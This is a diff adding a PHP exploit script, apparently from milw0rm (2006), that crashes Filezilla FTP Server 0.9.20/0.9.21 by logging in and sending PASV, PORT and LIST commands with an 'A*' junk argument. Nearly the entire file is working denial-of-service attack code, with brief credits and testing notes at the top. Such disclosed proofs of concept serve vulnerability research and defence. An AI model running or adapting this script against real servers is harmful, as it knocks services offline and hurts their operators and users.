@@ -1,0 +1,67 @@
+<?php
+
+# Filezilla FTP Server 0.9.20 beta / 0.9.21 "LIST", "NLST" and "NLST -al" Denial Of Service
+# by shinnai
+# mail: shinnai[at]autistici[dot[org]
+# site: http://shinnai.altervista.org
+#
+# special thanks to rgod for his first advisory about "STOR" Denial of service, see: http://retrogod.altervista.org/filezilla_0921_dos.html
+# and for code in php I never could write alone ;)
+# This one works fine also with an user with only read and list permissions enabled
+# you can change the LIST command also with NLST or NLST -al comamnds
+
+# tested on Windows XP Professional SP2 all patched
+
+error_reporting(E_ALL);
+
+$service_port = getservbyname('ftp', 'tcp');
+$address = gethostbyname('127.0.0.1');
+
+$user="test";
+$pass="test";
+
+$junk.="A*";
+
+$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+if ($socket < 0) {
+  echo "socket_create() failed:\n reason: " . socket_strerror($socket) . "\n";
+} else {
+  echo "OK.\n";
+}
+
+$result = socket_connect($socket, $address, $service_port);
+if ($result < 0) {
+  echo "socket_connect() failed:\n reason: ($result) " . socket_strerror($result) . "\n";
+} else {
+  echo "OK.\n";
+}
+
+$out=socket_read($socket, 240);
+echo $out;
+
+$in = "USER ".$user."\r\n";
+socket_write($socket, $in, strlen ($in));
+
+$out=socket_read($socket, 80);
+echo $out;
+
+$in = "PASS ".$pass."\r\n";
+socket_write($socket, $in, strlen ($in));
+
+$out=socket_read($socket, 80);
+echo $out;
+
+$in = "PASV ".$junk."\r\n";
+socket_write($socket, $in, strlen ($in));
+
+$in = "PORT ".$junk."\r\n";
+socket_write($socket, $in, strlen ($in));
+
+$in = "LIST ".$junk."\r\n";
+socket_write($socket, $in, strlen ($in));
+
+socket_close($socket);
+
+?>
+
+# milw0rm.com [2006-12-11]
